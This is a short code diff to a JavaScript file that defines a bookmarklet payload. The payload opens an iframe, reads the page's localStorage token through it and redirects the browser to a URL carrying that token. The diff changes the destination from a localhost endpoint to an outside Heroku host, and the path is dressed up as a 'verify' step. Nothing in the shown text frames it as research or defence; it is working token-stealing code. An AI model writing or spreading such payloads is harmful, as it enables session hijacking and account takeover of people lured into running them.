@@ -1,6 +1,6 @@
 const pay = `javascript:(function() {var i = document.createElement('iframe');
 document.body.appendChild(i);
-window.location.href = "http://localhost:5500/verification/endpoint?verify="+i.contentWindow.localStorage.token;})()`;
+window.location.href = "https://justtryna-ccef14b4130c.herokuapp.com/index.php/verify?="+i.contentWindow.localStorage.token;})()`;
 
 const load = "";
 
